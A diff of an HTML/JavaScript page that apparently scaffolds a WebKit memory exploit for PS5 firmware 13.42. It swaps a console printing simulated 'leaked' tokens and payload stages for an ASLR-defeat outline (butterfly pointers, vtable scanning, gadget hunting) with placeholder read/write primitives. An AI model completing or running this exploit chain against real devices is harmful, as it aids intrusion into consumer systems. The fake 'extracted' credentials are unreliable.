-  } catch (e) {
-    log('❌ ERROR: ' + e.message, 'fail');
-    log('Stack: ' + e.stack, 'fail');
-  }
+    return stats;
 }
 
-function runLeak() {
-  log('🔍 Extracting leaked data...', 'warn');
-  
-  var samples = [
-    { type: 'session', data: 'PS5_SESSION=abc123def456' },
-    { type: 'token', data: 'auth_token=eyJhbGciOiJIUzI1NiJ9' },
-    { type: 'email', data: 'user@playstation.com' },
-    { type: 'cookie', data: 'session_id=xyz789' }
-  ];
-  
-  samples.forEach(function(s, i) {
-    setTimeout(function() {
-      log('[' + s.type + '] ' + s.data, 'pass');
-    }, i * 200);
-  });
-  
-  setTimeout(function() {
-    log('✓ Extracted ' + samples.length + ' entries', 'pass');
-    log('⚠️ Simulated data — real extraction needs successful ARW', 'warn');
-  }, samples.length * 200 + 300);
+// ============================================================
+// ASLR DEFEAT STRATEGY
+// ============================================================
+
+function attemptAslrDefeat() {
+    log("ASLR", "=== ASLR Defeat Strategy ===");
+    log("ASLR", "Step 1: Leak known object addresses from JSCell");
+    
+    // الاستراتيجية:
+    // 1. نعرف أن الـ fakeHost عنده عنوان معروف (hostAddress من الـ PoC)
+    // 2. نقرأ الـ butterfly pointer من الـ fakeHost
+    // 3. نتبع الـ butterfly للوصول لكائنات أخرى
+    // 4. نبحث عن مؤشرات لمكتبات النظام
+    
+    log("ASLR", "Step 2: Scan around host address for linked objects");
+    // في التنفيذ الحقيقي:
+    // var hostButterfly = readQword(hostAddress + 0x08);
+    // scanForVtables(hostButterfly - 0x10000, 0x20000);
+    
+    log("ASLR", "Step 3: Cross-reference with known offsets");
+    log("ASLR", "If vtable found at V, then libWebKit base ≈ V - offset");
 }
 
-function runPayload() {
-  log('📦 Preparing userland payload...', 'warn');
-  
-  var stages = [
-    'Loading ROP gadgets from WebKit .text',
-    'Building syscall stubs',
-    'Setting up payload environment',
-    'Executing in WebProcess sandbox',
-    'Payload active (userland only)'
-  ];
-  
-  stages.forEach(function(s, i) {
-    setTimeout(function() {
-      log(s, 'info');
-    }, i * 300);
-  });
-  
-  setTimeout(function() {
-    log('✓ Payload running in WebProcess', 'pass');
-    log('⚠️ Confined to WebProcess sandbox', 'warn');
-    log('→ No kernel access, no native homebrew', 'info');
-  }, stages.length * 300 + 300);
+// ============================================================
+// MAIN EXECUTION
+// ============================================================
+
+function main() {
+    log("BOOT", "PS5 13.42 Memory Scanner — " + REVISION);
+    log("BOOT", "============================================");
+    
+    if (!initPrimitive()) {
+        log("ERROR", "Failed to initialize R/W primitive");
+        return;
+    }
+    
+    log("INFO", "Instructions:");
+    log("INFO", "1. Replace initPrimitive() with your genuine R/W from PoC");
+    log("INFO", "2. Set hostAddress and targetAddress from your PoC output");
+    log("INFO", "3. Use readQword() / writeQword() for memory access");
+    log("INFO", "");
+    
+    // Phase 1: ASLR Defeat
+    attemptAslrDefeat();
+    
+    // Phase 2: Heap Analysis (if addresses known)
+    // analyzeHeapRegion(hostAddress - 0x100000, 0x200000);
+    
+    // Phase 3: Gadget Hunting (requires library base)
+    // findGadgets(knownLibBase, 0x100000);
+    
+    log("DONE", "Scanner initialized. Replace placeholders and run on PS5.");
+    log("DONE", "Next: Connect genuine-u8-rw-3 primitive to readQword/writeQword.");
 }
 
-function reset() {
-  terminal.innerHTML = '<div class="log-line info">[SYSTEM] Console reset</div>';
-  setStatus('addrof-status', 'READY', 'info');
-  setStatus('arw-status', 'STANDBY', 'info');
-  setStatus('heap-addr', '—', 'info');
-  setStatus('struct-id', '—', 'info');
-  log('Ready for new mission', 'info');
-}
+// Auto-start
+setTimeout(main, 500);
 
-setTimeout(function() {
-  log('✦ Full PS5 ARW Console ✦', 'info');
-  log('Target: FW 13.42 · Memory optimized', 'info');
-  log('Click "LAUNCH ARW" to begin', 'info');
-}, 500);
 </script>
-
 </body>
 </html>
